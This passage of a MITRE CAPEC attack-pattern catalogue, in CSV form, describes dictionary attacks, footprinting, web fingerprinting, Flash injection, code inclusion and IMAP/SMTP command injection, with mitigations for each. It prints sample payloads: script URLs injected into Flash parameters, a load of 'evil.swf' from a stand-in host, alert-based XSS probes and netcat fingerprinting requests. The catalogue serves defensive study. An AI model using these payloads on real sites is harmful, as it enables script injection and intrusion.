the attack.::",::Many invalid login attempts are coming from the same machine (same IP address) or for the same log in name. The login attempts use passwords that are dictionary words.::,::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthenticationTECHNICAL IMPACT:Gain Privileges::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::,::Create a strong password policy and ensure that your system enforces this policy.::Implement an intelligent password throttling mechanism. Care must be taken to assure that these mechanisms do not excessively enable account lockout attacks such as CAPEC-2.::Leverage multi-factor authentication for all authentication services.::,"::A system user selects the word treacherous as their passwords believing that it would be very difficult to guess. The password-based dictionary attack is used to crack this password and gain access to the account.::The Cisco LEAP challenge/response authentication mechanism uses passwords in a way that is susceptible to dictionary attacks, which makes it easier for remote attackers to gain privileges via brute force password guessing attacks. Cisco LEAP is a mutual authentication algorithm that supports dynamic derivation of session keys. With Cisco LEAP, mutual authentication relies on a shared secret, the user's logon password (which is known by the client and the network), and is used to respond to challenges between the user and the Remote Authentication Dial-In User Service (RADIUS) server. Methods exist for someone to write a tool to launch an offline dictionary attack on password-based authentications that leverage Microsoft MS-CHAP, such as Cisco LEAP. The tool leverages large password lists to efficiently launch offline dictionary attacks against LEAP user accounts, collected through passive sniffing or active techniques.See also: CVE-2003-1096::",::521::262::263::654::307::308::309::,N/A,N/A,https://capec.mitre.org/data/definitions/16.html
CAPEC-160,Exploit Script-Based APIs,Standard,Draft,"Some APIs support scripting instructions as arguments. Methods that take scripted instructions (or references to scripted instructions) can be very flexible and powerful. However, if an attacker can specify the script that serves as input to these methods they can gain access to a great deal of functionality. For example, HTML pages support <script> tags that allow scripting languages to be embedded in the page and then interpreted by the receiving web browser. If the content provider is malicious, these scripts can compromise the client application. Some applications may even execute the scripts under their own identity (rather than the identity of the user providing the script) which can allow attackers to perform activities that would otherwise be denied to them.",N/A,N/A,Medium,::NATURE:ChildOf:CAPEC ID:113::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Identify API] Discover an API of interest by exploring application documentation or observing responses to API callsTECHNIQUE:Search via internet for known, published APIs that support scripting instructions as arguments::STEP:2:PHASE:Experiment:DESCRIPTION:[Test simple script] Adversaries will attempt to give a smaller script as input to the API, such as simply printing to the console, to see if the attack is viable.TECHNIQUE:Create a general script to be taken as input by the API::STEP:3:PHASE:Exploit:DESCRIPTION:[Give malicious scripting instructions to API] Adversaries will now craft custom scripts to do malicious behavior. Depending on the setup of the application this script could be run with user or admin level priveleges.TECHNIQUE:Crafting a malicious script to be run on a system based on priveleges and capabilities of the system::",::The target application must include the use of APIs that execute scripts.::The target application must allow the attacker to provide some or all of the arguments to one of these script interpretation methods and must fail to adequately filter these arguments for dangerous or unwanted script commands.::,N/A,::None: No specialized resources are required to execute this type of attack.::,N/A,N/A,N/A,N/A,::346::,N/A,N/A,https://capec.mitre.org/data/definitions/160.html
CAPEC-166,Force the System to Reset Values,Standard,Draft,"An attacker forces the target into a previous state in order to leverage potential weaknesses in the target dependent upon a prior configuration or state-dependent factors. Even in cases where an attacker may not be able to directly control the configuration of the targeted application, they may be able to reset the configuration to a prior state since many applications implement reset functions.",N/A,N/A,Medium,::NATURE:ChildOf:CAPEC ID:161::,N/A,::The targeted application must have a reset function that returns the configuration of the application to an earlier state.::The reset functionality must be inadequately protected against use.::,N/A,"::None: No specialized resources are required to execute this type of attack. In some cases, the attacker may need special client applications in order to execute the reset functionality.::",N/A,N/A,N/A,N/A,::306::1221::1232::,N/A,N/A,https://capec.mitre.org/data/definitions/166.html
CAPEC-168,Windows ::DATA Alternate Data Stream,Detailed,Draft,"An attacker exploits the functionality of Microsoft NTFS Alternate Data Streams (ADS) to undermine system security. ADS allows multiple files to be stored in one directory entry referenced as filename:streamname. One or more alternate data streams may be stored in any file or directory. Normal Microsoft utilities do not show the presence of an ADS stream attached to a file. The additional space for the ADS is not recorded in the displayed file size. The additional space for ADS is accounted for in the used space on the volume. An ADS can be any type of file. ADS are copied by standard Microsoft utilities between NTFS volumes. ADS can be used by an attacker or intruder to hide tools, scripts, and data from detection by normal system utilities. Many anti-virus programs do not check for or scan ADS. Windows Vista does have a switch (-R) on the command line DIR command that will display alternate streams.",N/A,N/A,Medium,::NATURE:ChildOf:CAPEC ID:636::,N/A,::The target must be running the Microsoft NTFS file system.::,N/A,::The attacker must have command line or programmatic access to the target's files system with write/read permissions.::,N/A,N/A,::Design: Use FAT file systems which do not support Alternate Data Streams.::Implementation: Use Vista dir with the -R switch or utility to find Alternate Data Streams and take appropriate action with those discovered.::Implementation: Use products that are Alternate Data Stream aware for virus scanning and system security operations.::,N/A,::212::69::,TAXONOMY NAME:OWASP Attacks:ENTRY NAME:Windows alternate data stream::,N/A,https://capec.mitre.org/data/definitions/168.html
CAPEC-169,Footprinting,Meta,Stable,"An adversary engages in probing and exploration activities to identify constituents and properties of the target. Footprinting is a general term to describe a variety of information gathering techniques, often used by attackers in preparation for some attack. It consists of using tools to learn as much as possible about the composition, configuration, and security mechanisms of the targeted application, system or network. Information that might be collected during a footprinting effort could include open ports, applications and their versions, network topology, and similar information. Although similar to fingerprinting, footprinting aims to get a more holistic view of a system or network, whereas fingerprinting is more targeted to a specific application or operating system. While footprinting is not intended to be damaging (although certain activities, such as network scans, can sometimes cause disruptions to vulnerable applications inadvertently) it may often pave the way for more damaging attacks.",N/A,High,Very Low,N/A,"::STEP:1:PHASE:Explore:DESCRIPTION:[Request Footprinting] The attacker examines the website information and source code of the website and uses automated tools to get as much information as possible about the system and organization.TECHNIQUE:Open Source Footprinting: Examine the website about the organization and skim through the webpage's HTML source to look for comments.:TECHNIQUE:Network Enumeration: Perform various queries (Registrar Query, Organizational Query, Domain Query, Network Query, POC Query) on the many whois databases found on the internet to identify domain names and associated networks.:TECHNIQUE:DNS Interrogation: Once basic information is gathered the attack could begin to query DNS.:TECHNIQUE:Other Techniques: Use ping sweep, TCP scan, UDP scan, OS Identification various techniques to gain more information about the system and network.::","::An application must publicize identifiable information about the system or application through voluntary or involuntary means. Certain identification details of information systems are visible on communication networks (e.g., if an adversary uses a sniffer to inspect the traffic) due to their inherent structure and protocol standards. Any system or network that can be detected can be footprinted. However, some configuration choices may limit the useful information that can be collected during a footprinting attack.::","::SKILL:The adversary knows how to send HTTP request, run the scan tool.:LEVEL:Low::",::The adversary requires a variety of tools to collect information about the target. These include port/network scanners and tools to analyze responses from applications to determine version and configuration information. Footprinting a system adequately may also take a few days if the attacker wishes the footprinting attempt to go undetected.::,N/A,::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::,"::Keep patches up to date by installing weekly or daily if possible.::Shut down unnecessary services/ports.::Change default passwords by choosing strong passwords.::Curtail unexpected input.::Encrypt and password-protect sensitive data.::Avoid including information that has the potential to identify and compromise your organization's security such as access to business plans, formulas, and proprietary documents.::","::In this example let us look at the website http://www.example.com to get much information we can about Alice. From the website, we find that Alice also runs foobar.org. We type in www example.com into the prompt of the Name Lookup window in a tool, and our result is this IP address: 192.173.28.130 We type the domain into the Name Lookup prompt and we are given the same IP. We can safely say that example and foobar.org are hosted on the same box. But if we were to do a reverse name lookup on the IP, which domain will come up? www.example.com or foobar.org? Neither, the result is nijasvspirates.org. So nijasvspirates.org is the name of the box hosting 31337squirrel.org and foobar.org. So now that we have the IP, let's check to see if nijasvspirates is awake. We type the IP into the prompt in the Ping window. We'll set the interval between packets to 1 millisecond. We'll set the number of seconds to wait until a ping times out to 5. We'll set the ping size to 500 bytes and we'll send ten pings. Ten packets sent and ten packets received. nijasvspirates.org returned a message to my computer within an average of 0.35 seconds for every packet sent. nijasvspirates is alive. We open the Whois window and type nijasvspirates.org into the Query prompt, and whois.networksolutions.com into the Server prompt. This means we'll be asking Network Solutions to tell us everything they know about nijasvspirates.org. The result is this laundry list of info: Registrant: FooBar (nijasvspirates -DOM) p.o.box 11111 SLC, UT 84151 US Domain Name: nijasvspirates.ORG Administrative Contact, Billing Contact: Smith, John jsmith@anonymous.net FooBar p.o.box 11111 SLC, UT 84151 555-555-6103 Technical Contact: Johnson, Ken kj@fierymonkey.org fierymonkey p.o.box 11111 SLC, UT 84151 555-555-3849 Record last updated on 17-Aug-2001. Record expires on 11-Aug-2002. Record created on 11-Aug-2000. Database last updated on 12-Dec-2001 04:06:00 EST. Domain servers in listed order: NS1. fierymonkey.ORG 192.173.28.130 NS2. fierymonkey.ORG 64.192.168.80 A corner stone of footprinting is Port Scanning. Let's port scan nijasvspirates.org and see what kind of services are running on that box. We type in the nijasvspirates IP into the Host prompt of the Port Scan window. We'll start searching from port number 1, and we'll stop at the default Sub7 port, 27374. Our results are: 21 TCP ftp 22 TCP ssh SSH-1.99-OpenSSH_2.30 25 TCP smtp 53 TCP domain 80 TCP www 110 TCP pop3 111 TCP sunrpc 113 TCP ident Just by this we know that Alice is running a website and email, using POP3, SUNRPC (SUN Remote Procedure Call), and ident.::",::200::,TAXONOMY NAME:ATTACK:ENTRY ID:1217:ENTRY NAME:Browser Bookmark Discovery::::TAXONOMY NAME:ATTACK:ENTRY ID:1595:ENTRY NAME:Active Scanning::,N/A,https://capec.mitre.org/data/definitions/169.html
CAPEC-17,Using Malicious Files,Standard,Draft,"An attack of this type exploits a system's configuration that allows an adversary to either directly access an executable file, for example through shell access; or in a possible worst case allows an adversary to upload a file and then execute it. Web servers, ftp servers, and message oriented middleware systems which have many integration points are particularly vulnerable, because both the programmers and the administrators must be in synch regarding the interfaces and the correct privileges for each interface.",N/A,High,Very High,::NATURE:ChildOf:CAPEC ID:122::NATURE:CanPrecede:CAPEC ID:233::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Determine File/Directory Configuration] The adversary looks for misconfigured files or directories on a system that might give executable access to an overly broad group of users.TECHNIQUE:Through shell access to a system, use the command ls -l to view permissions for files and directories.::STEP:2:PHASE:Experiment:DESCRIPTION:[Upload Malicious Files] If the adversary discovers a directory that has executable permissions, they will attempt to upload a malicious file to execute.TECHNIQUE:Upload a malicious file through a misconfigured FTP server.::STEP:3:PHASE:Exploit:DESCRIPTION:[Execute Malicious File] The adversary either executes the uploaded malicious file, or executes an existing file that has been misconfigured to allow executable access to the adversary.::",::System's configuration must allow an attacker to directly access executable files or upload files to execute. This means that any access control system that is supposed to mediate communications between the subject and the object is set incorrectly or assumes a benign environment.::,::SKILL:To identify and execute against an over-privileged system interface:LEVEL:Low::,"::Ability to communicate synchronously or asynchronously with server that publishes an over-privileged directory, program, or interface. Optionally, ability to capture output directly through synchronous communication or other method such as FTP.::",N/A,::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands Run Arbitrary Code::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::,"::Design: Enforce principle of least privilege::Design: Run server interfaces with a non-root account and/or utilize chroot jails or other configuration techniques to constrain privileges even if attacker gains some limited access to commands.::Implementation: Perform testing such as pen-testing and vulnerability scanning to identify directories, programs, and interfaces that grant direct access to executables.::",::Consider a directory on a web server with the following permissions drwxrwxrwx 5 admin public 170 Nov 17 01:08 webroot This could allow an attacker to both execute and upload and execute programs' on the web server. This one vulnerability can be exploited by a threat to probe the system and identify additional vulnerabilities to exploit.::,::732::285::272::59::282::270::693::,TAXONOMY NAME:ATTACK:ENTRY ID:1574.010:ENTRY NAME:Hijack Execution Flow:Services File Permissions Weakness::,N/A,https://capec.mitre.org/data/definitions/17.html
CAPEC-170,Web Application Fingerprinting,Detailed,Draft,"An attacker sends a series of probes to a web application in order to elicit version-dependent and type-dependent behavior that assists in identifying the target. An attacker could learn information such as software versions, error pages, and response headers, variations in implementations of the HTTP protocol, directory structures, and other similar information about the targeted service. This information can then be used by an attacker to formulate a targeted attack plan. While web application fingerprinting is not intended to be damaging (although certain activities, such as network scans, can sometimes cause disruptions to vulnerable applications inadvertently) it may often pave the way for more damaging attacks.",N/A,High,Low,::NATURE:ChildOf:CAPEC ID:541::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Request fingerprinting] Use automated tools or send web server specific commands to web server and wait for server's response.TECHNIQUE:Use automated tools or send web server specific commands to web server and then receive server's response.::STEP:2:PHASE:Experiment:DESCRIPTION:[Increase the accuracy of server fingerprinting of Web servers] Attacker usually needs to send several different commands to accurately identify the web server. Attacker can also use automated tools to send requests to the server. The responses of the server may be different in terms of protocol behavior.TECHNIQUE:Observe the ordering of the several HTTP response headers. The ordering of the header of each server may have unique identities.:TECHNIQUE:Send bad requests or requests of nonexistent pages to the server.:TECHNIQUE:Attacker takes existing automated tools to recognize the type and the version of the web server in use.::STEP:3:PHASE:Experiment:DESCRIPTION:[Identify Web Application Software] After the web server platform software has been identified, the attacker start to identify web application technologies such as ASP, .NET, PHP and Java on the server.TECHNIQUE:Examine the file name extensions in URL, for example .php indicates PHP script interfaced with Apache server.:TECHNIQUE:Examine the HTTP Response Headers. This may leak information about software signatures:TECHNIQUE:Examine Cookies that may contain server's software information.:TECHNIQUE:Check error pages.::STEP:4:PHASE:Experiment:DESCRIPTION:[Identify Backend Database Version] Determining the database engine type can assist attackers' attempt to successfully execute SQL injection. Some database API such as ODBC will show a database type as part of the driver information when reporting an error.TECHNIQUE:Use tools to send bogus SQL query to the server and check error pages.::","::Any web application can be fingerprinted. However, some configuration choices can limit the useful information an attacker may collect during a fingerprinting attack.::","::SKILL:Attacker knows how to send HTTP request, SQL query to a web application.:LEVEL:Low::","::While simple fingerprinting can be accomplished with only a web browser, for more thorough fingerprinting an attacker requires a variety of tools to collect information about the target. These tools might include protocol analyzers, web-site crawlers, and fuzzing tools. Footprinting a service adequately may also take a few days if the attacker wishes the footprinting attempt to go undetected.::",N/A,::SCOPE:ConfidentialityTECHNICAL IMPACT:Other:NOTE:Confidentiality Other Information Leakage::,::Implementation: Obfuscate server fields of HTTP response.::Implementation: Hide inner ordering of HTTP response header.::Implementation: Customizing HTTP error codes such as 404 or 500.::Implementation: Hide URL file extension.::Implementation: Hide HTTP response header software information filed.::Implementation: Hide cookie's software information filed.::Implementation: Appropriately deal with error messages.::Implementation: Obfuscate database type in Database API's error message.::,"::An attacker sends malformed requests or requests of nonexistent pages to the server. Consider the following HTTP responses. Response from Apache 1.3.23$ nc apache.server.com80 GET / HTTP/3.0 HTTP/1.1 400 Bad RequestDate: Sun, 15 Jun 2003 17:12: 37 GMTServer: Apache/1.3.23Connection: closeTransfer: chunkedContent-Type: text/HTML; charset=iso-8859-1 Response from IIS 5.0$ nc iis.server.com 80GET / HTTP/3.0 HTTP/1.1 200 OKServer: Microsoft-IIS/5.0Content-Location: http://iis.example.com/Default.htmDate: Fri, 01 Jan 1999 20:14: 02 GMTContent-Type: text/HTMLAccept-Ranges: bytes Last-Modified: Fri, 01 Jan 1999 20:14: 02 GMTETag: W/e0d362a4c335be1: ae1Content-Length: 133 [REF-37]::",::497::,N/A,N/A,https://capec.mitre.org/data/definitions/170.html
CAPEC-174,Flash Parameter Injection,Detailed,Draft,An adversary takes advantage of improper data validation to inject malicious global parameters into a Flash file embedded within an HTML document. Flash files can leverage user-submitted data to configure the Flash document and access the embedding HTML document.,N/A,High,Medium,::NATURE:ChildOf:CAPEC ID:182::NATURE:CanAlsoBe:CAPEC ID:460::NATURE:CanPrecede:CAPEC ID:63::NATURE:CanPrecede:CAPEC ID:178::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Spider] Using a browser or an automated tool, an adversary records all instances of HTML documents that have embedded Flash files. If there is an embedded Flash file, they list how to pass global parameters to the Flash file from the embedding object.TECHNIQUE:Use an automated tool to record all instances of URLs which have embedded Flash files and list the parameters passing to the Flash file.:TECHNIQUE:Use a browser to manually explore the website to see whether the HTML document has embedded Flash files or not and list the parameters passing to the Flash file.::STEP:2:PHASE:Experiment:DESCRIPTION:[Determine the application susceptibility to Flash parameter injection] Determine the application susceptibility to Flash parameter injection. For each URL identified in the Explore phase, the adversary attempts to use various techniques such as DOM based, reflected, flashvars, and persistent attacks depending on the type of parameter passed to the embedded Flash file.TECHNIQUE:When the JavaScript 'document.location' variable is used as part of the parameter, inject '#' and the payload into the parameter in the URL.:TECHNIQUE:When the name of the Flash file is exposed as a form or a URL parameter, the adversary injects '?' and the payload after the file name in the URL to override some global value.:TECHNIQUE:When the arguments passed in the 'flashvars' attributes, the adversary injects '&' and payload in the URL.:TECHNIQUE:If some of the attributes of the <object> tag are received as parameters, the 'flashvars' attribute is injected into the <object> tag without the creator of the Web page ever intending to allow arguments to be passed into the Flash file.:TECHNIQUE:If shared objects are used to save data that is entered by the user persistent Flash parameter injection may occur, with malicious code being injected into the Flash file and executed, every time the Flash file is loaded.::STEP:3:PHASE:Exploit:DESCRIPTION:[Execute Flash Parameter Injection Attack] Inject parameters into Flash file. Based on the results of the Experiment phase, the adversary crafts the underlying malicious URL containing injected Flash parameters and submits it to the web server. Once the web server receives the request, the embedding HTML document will controllable by the adversary.TECHNIQUE:Craft underlying malicious URL and send it to the web server to take control of the embedding HTML document.::",N/A,::SKILL:The adversary need inject values into the global parameters to the Flash file and understand the parent HTML document DOM structure. The adversary needs to be smart enough to convince the victim to click on their crafted link.:LEVEL:Medium::,::The adversary must convince the victim to click their crafted link.::,N/A,::SCOPE:ConfidentialityTECHNICAL IMPACT:Other:NOTE:Confidentiality Other Information Leakage::SCOPE:AuthorizationTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Authorization Execute Unauthorized Commands Run Arbitrary Code::,"::User input must be sanitized according to context before reflected back to the user. The JavaScript function 'encodeURI' is not always sufficient for sanitizing input intended for global Flash parameters. Extreme caution should be taken when saving user input in Flash cookies. In such cases the Flash file itself will need to be fixed and recompiled, changing the name of the local shared objects (Flash cookies).::","::The following are examples for different types of parameters passed to the Flash file. DOM-based Flash parameter injection <object><embed src=myFlash.swf flashvars=location=http://example.com/index.htm#&globalVar=e-v-i-l></embed> </object> Passing parameter in an embedded URI<object type=application/x-shockwave-flash data=myfile.swf?globalVar=e-v-i-l ></object> Passing parameter in flashvars<object type=application/x-shockwafile.swf ve-flash data=my flashvars=language=English&globalVar=e-v-i-l></object> Persistent Flash Parameter Injection // Create a new shared object or read an existing one mySharedObject = SharedObject.getLocal(flashToLoad);if (_root.flashfile == undefined) { // Check whether there is a shared object saved if (mySharedObject.data.flash == null) { // Set a default value _root.flashfile = defaultFlash.swf; } else { // Read the flash file to load from the shared object _root.flashfile = mySharedObject.data.flash; } } // Store the flash file's name in the shared object mySharedObject.data.flash = _root.flashfile; // Load the flash file getURL(_root.flashfile); If an unsuspecting user is lured by an adversary to click on link like this: http://example.com/vulnerable.swf?flashfile=javascript:alert(document.domain) The result will be not merely a one-time execution of the JavaScript code in the victim's browser in the context of the domain with the vulnerable Flash file, but every time the Flash is loaded, whether by direct reference or embedded inside the same domain, the JavaScript will be executed again.::",::88::,N/A,N/A,https://capec.mitre.org/data/definitions/174.html
CAPEC-175,Code Inclusion,Meta,Stable,"An adversary exploits a weakness on the target to force arbitrary code to be retrieved locally or from a remote location and executed. This differs from code injection in that code injection involves the direct inclusion of code while code inclusion involves the addition or replacement of a reference to a code file, which is subsequently loaded by the target and used as part of the code of some application.",N/A,Medium,Very High,N/A,N/A,"::The target application must include external code/libraries that are executed when the application runs and the adversary must be able to influence the specific files that get included.::The victim must run the targeted application, possibly using the crafted parameters that the adversary uses to identify the code to include.::",N/A,::The adversary may need the capability to host code modules if they wish their own code files to be included.::,N/A,N/A,N/A,::One example of this type of attack pattern is PHP file include attacks where the parameter of an include() function is set by a variable that an attacker is able to control. The result is that arbitrary code could be loaded into the PHP application and executed.::,::829::,N/A,N/A,https://capec.mitre.org/data/definitions/175.html
CAPEC-177,Create files with the same name as files protected with a higher classification,Detailed,Draft,"An attacker exploits file location algorithms in an operating system or application by creating a file with the same name as a protected or privileged file. The attacker could manipulate the system if the attacker-created file is trusted by the operating system or an application component that attempts to load the original file. Applications often load or include external files, such as libraries or configuration files. These files should be protected against malicious manipulation. However, if the application only uses the name of the file when locating it, an attacker may be able to create a file with the same name and place it in a directory that the application will search before the directory with the legitimate file is searched. Because the attackers' file is discovered first, it would be used by the target application. This attack can be extremely destructive if the referenced file is executable and/or is granted special privileges based solely on having a particular name.",N/A,N/A,Very High,::NATURE:ChildOf:CAPEC ID:17::,N/A,"::The target application must include external files. Most non-trivial applications meet this criterion.::The target application does not verify that a located file is the one it was looking for through means other than the name. Many applications fail to perform checks of this type.::The directories the target application searches to find the included file include directories writable by the attacker which are searched before the protected directory containing the actual files. It is much less common for applications to meet this criterion, but if an attacker can manipulate the application's search path (possibly by controlling environmental variables) then they can force this criterion to be met.::",N/A,::The attacker must have sufficient access to place an arbitrarily named file somewhere early in the application's search path.::,N/A,N/A,N/A,N/A,::706::,TAXONOMY NAME:ATTACK:ENTRY ID:1036:ENTRY NAME:Masquerading::,N/A,https://capec.mitre.org/data/definitions/177.html
CAPEC-180,Exploiting Incorrectly Configured Access Control Security Levels,Standard,Draft,"An attacker exploits a weakness in the configuration of access controls and is able to bypass the intended protection that these measures guard against and thereby obtain unauthorized access to the system or network. Sensitive functionality should always be protected with access controls. However configuring all but the most trivial access control systems can be very complicated and there are many opportunities for mistakes. If an attacker can learn of incorrectly configured access security settings, they may be able to exploit this in an attack.",N/A,High,Medium,::NATURE:ChildOf:CAPEC ID:122::NATURE:CanPrecede:CAPEC ID:17::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Survey] The attacker surveys the target application, possibly as a valid and authenticated user.TECHNIQUE:Spider the web site for all available links.:TECHNIQUE:Brute force to guess all function names/action with different privileges.::STEP:2:PHASE:Experiment:DESCRIPTION:[Identify weak points in access control configurations] The attacker probes the access control for functions and data identified in the Explore phase to identify potential weaknesses in how the access controls are configured.TECHNIQUE:The attacker attempts authenticated access to targeted functions and data.:TECHNIQUE:The attacker attempts unauthenticated access to targeted functions and data.:TECHNIQUE:The attacker attempts indirect and side channel access to targeted functions and data.::STEP:3:PHASE:Exploit:DESCRIPTION:[Access the function or data bypassing the access control] The attacker executes the function or accesses the data identified in the Explore phase bypassing the access control.TECHNIQUE:The attacker executes the function or accesses the data not authorized to them.::","::The target must apply access controls, but incorrectly configure them. However, not all incorrect configurations can be exploited by an attacker. If the incorrect configuration applies too little security to some functionality, then the attacker may be able to exploit it if the access control would be the only thing preventing an attacker's access and it no longer does so. If the incorrect configuration applies too much security, it must prevent legitimate activity and the attacker must be able to force others to require this activity..::","::SKILL:In order to discover unrestricted resources, the attacker does not need special tools or skills. They only have to observe the resources or access mechanisms invoked as each action is performed and then try and access those access mechanisms directly.:LEVEL:Low::",::None: No specialized resources are required to execute this type of attack.::,N/A,::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:AuthorizationTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Authorization Execute Unauthorized Commands Run Arbitrary Code::SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism::SCOPE:AvailabilityTECHNICAL IMPACT:Unreliable Execution::,::Design: Configure the access control correctly.::,"::For example, an incorrectly configured Web server, may allow unauthorized access to it, thus threaten the security of the Web application.::",::732::1190::1193::1220::1268::1280::1297::1311::1315::1318::1320::1321::,N/A,N/A,https://capec.mitre.org/data/definitions/180.html
CAPEC-181,Flash File Overlay,Detailed,Draft,"An attacker creates a transparent overlay using flash in order to intercept user actions for the purpose of performing a clickjacking attack. In this technique, the Flash file provides a transparent overlay over HTML content. Because the Flash application is on top of the content, user actions, such as clicks, are caught by the Flash application rather than the underlying HTML. The action is then interpreted by the overlay to perform the actions the attacker wishes.",N/A,N/A,Medium,::NATURE:ChildOf:CAPEC ID:103::,N/A,::The victim must be tricked into navigating to the attackers' decoy site and performing the actions on the decoy page.::The victim's browser must support invisible Flash overlays.::,N/A,::The attacker must be able to force the Flash overlay over the decoy content.::,N/A,N/A,N/A,N/A,::1021::,N/A,N/A,https://capec.mitre.org/data/definitions/181.html
CAPEC-182,Flash Injection,Standard,Draft,"An attacker tricks a victim to execute malicious flash content that executes commands or makes flash calls specified by the attacker. One example of this attack is cross-site flashing, an attacker controlled parameter to a reference call loads from content specified by the attacker.",N/A,High,Medium,::NATURE:ChildOf:CAPEC ID:137::NATURE:CanAlsoBe:CAPEC ID:248::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Find Injection Entry Points] The attacker first takes an inventory of the entry points of the application.TECHNIQUE:Spider the website for all available URLs that reference a Flash application.:TECHNIQUE:List all uninitialized global variables (such as _root.*, _global.*, _level0.*) in ActionScript, registered global variables in included files, load variables to external movies.::STEP:2:PHASE:Experiment:DESCRIPTION:[Determine the application's susceptibility to Flash injection] Determine the application's susceptibility to Flash injection. For each URL identified in the explore phase, the attacker attempts to use various techniques such as direct load asfunction, controlled evil page/host, Flash HTML injection, and DOM injection to determine whether the application is susceptible to Flash injection.TECHNIQUE:Test the page using direct load asfunction, getURL,javascript:gotRoot()///d.jpg:TECHNIQUE:Test the page using controlled evil page/host, http://example.com/evil.swf:TECHNIQUE:Test the page using Flash HTML injection, '><img src='asfunction:getURL,javascript:gotRoot()//.jpg' >:TECHNIQUE:Test the page using DOM injection, (gotRoot(''))::STEP:3:PHASE:Exploit:DESCRIPTION:[Inject malicious content into target] Inject malicious content into target utilizing vulnerable injection vectors identified in the Experiment phase::","::The target must be capable of running Flash applications. In some cases, the victim must follow an attacker-supplied link.::","::SKILL:The attacker needs to have knowledge of Flash, especially how to insert content the executes commands.:LEVEL:Medium::",::None: No specialized resources are required to execute this type of attack. The attacker may need to be able to serve the injected Flash content.::,N/A,::SCOPE:ConfidentialityTECHNICAL IMPACT:Other:NOTE:Confidentiality Other Information Leakage::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:AuthorizationTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Authorization Execute Unauthorized Commands Run Arbitrary Code::SCOPE:Accountability:SCOPE:Authentication:SCOPE:Authorization:SCOPE:Non-RepudiationTECHNICAL IMPACT:Gain Privileges::SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism::,::Implementation: remove sensitive information such as user name and password in the SWF file.::Implementation: use validation on both client and server side.::Implementation: remove debug information.::Implementation: use SSL when loading external data::Implementation: use crossdomain.xml file to allow the application domain to load stuff or the SWF file called by other domain.::,"::In the following example, the SWF file contains getURL('javascript:SomeFunc(someValue)','','GET') A request like http://example.com/noundef.swf?a=0:0;alert('XSS') becomes javascript:SomeFunc(someValue)?a=0:0;alert(123)::",::20::184::697::,N/A,N/A,https://capec.mitre.org/data/definitions/182.html
CAPEC-183,IMAP/SMTP Command Injection,Standard,Draft,"An adversary exploits weaknesses in input validation on web-mail servers to execute commands on the IMAP/SMTP server. Web-mail servers often sit between the Internet and the IMAP or SMTP mail server. User requests are received by the web-mail servers which then query the back-end mail server for the requested information and return this response to the user. In an IMAP/SMTP command injection attack, mail-server commands are embedded in parts of the request sent to the web-mail server. If the web-mail server fails to adequately sanitize these requests, these commands are then sent to the back-end mail server when it is queried by the web-mail server, where the commands are then executed. This attack can be especially dangerous since administrators may assume that the back-end server is protected against direct Internet access and therefore may not secure it adequately against the execution of malicious commands.",N/A,N/A,Medium,::NATURE:ChildOf:CAPEC ID:248::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Identify Target Web-Mail Server] The adversary first identifies the web-mail server they wish to exploit.::STEP:2:PHASE:Experiment:DESCRIPTION:[Identify Vulnerable Parameters] Once the adversary has identified a web-mail server, they identify any vulnerable parameters by altering their values in requests. The adversary knows that the parameter is vulnerable if the web-mail server returns an error of any sort. Ideally, the adversary is looking for a descriptive error message.TECHNIQUE:Assign a null value to a parameter being used by the web-mail server and observe the response.:TECHNIQUE:Assign a random value to a parameter being used by the web-mail server and observe the response.:TECHNIQUE:Add additional values to a parameter being used by the web-mail server and observe the response.:TECHNIQUE:Add non standard special characters (i.e.: , ', , @, #, !, |) to a parameter being used by the web-mail server and observe the response.:TECHNIQUE:Eliminate a parameter being used by the web-mail server and observe the response.::STEP:3:PHASE:Experiment:DESCRIPTION:[Determine Level of Injection] After identifying all vulnerable parameters, the adversary determines what level of injection is possible.TECHNIQUE:Evaluate error messages to determine what IMAP/SMTP command is being executed for the vulnerable parameter. Sometimes the actually query will be placed in the error message.:TECHNIQUE:If there aren't descriptive error messages, the adversary will analyze the affected functionality to deduce the possible commands that could be being used by the mail-server.::STEP:4:PHASE:Exploit:DESCRIPTION:[Inject IMAP/SMTP Commands] The adversary manipulates the vulnerable parameters to inject an IMAP/SMTP command and execute it on the mail-server.TECHNIQUE:Structure the injection as a header, body, and footer. The header contains the ending of the expected message, the body contains the injection of the new command, and the footer contains the beginning of the expected command.:TECHNIQUE:Each part of the injection payload needs to be terminated with the CRLF (%0d%0a) sequence.::",::The target environment must consist of a web-mail server that the attacker can query and a back-end mail server. The back-end mail server need not be directly accessible to the attacker.::The web-mail server must fail to adequately sanitize fields received from users and passed on to the back-end mail server.::The back-end mail server must not be adequately secured against receiving malicious commands from the web-mail server.::,N/A,"::None: No specialized resources are required to execute this type of attack. However, in most cases, the attacker will need to be a recognized user of the web-mail server.::",N/A,N/A,N/A,N/A,::77::,N/A,N/A,https://capec.mitre.org/data/definitions/183.html
